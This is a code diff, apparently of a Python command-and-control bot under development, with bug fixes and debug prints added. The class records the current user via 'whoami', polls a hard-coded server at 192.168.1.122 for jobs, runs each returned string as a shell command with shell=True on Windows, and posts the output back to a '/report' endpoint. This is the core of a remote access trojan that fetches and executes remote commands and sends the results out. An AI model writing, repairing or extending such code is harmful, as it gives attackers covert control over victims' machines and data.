@@ -14,11 +14,11 @@ class Bot(object):
 
     def __init__(self):
         self.platform = platform.system()
-        self.uid = hex(uuid.get_node())
+        self.uid = "2315"
         self.username = self.curr_user()
         self.hostname = "end again"
 
-    def curr_user():
+    def curr_user(self):
         user = os.popen('whoami').read()
         user = user.split("\\", 1)[-1]
         return user
@@ -36,16 +36,19 @@ class Bot(object):
         r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/status', json=send)
         return r.text
 
-    def send_output(output):
+    def send_output(self, output):
         r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/report', data= {'output':output})
 
-    def run_command(command):
+    def run_command(self,command):
         if self.platform == "Windows":
-            self.send_output(check_output(command, shell=True).decode())
+            out = check_output(command, shell=True).decode()
+            print(out)
+            self.send_output(out)
 
     def run(self):
-
-        self.run_command(self.ping_server())
+        job = self.ping_server()
+        print(job)
+        self.run_command(job)
 
         """
         start = time.time()
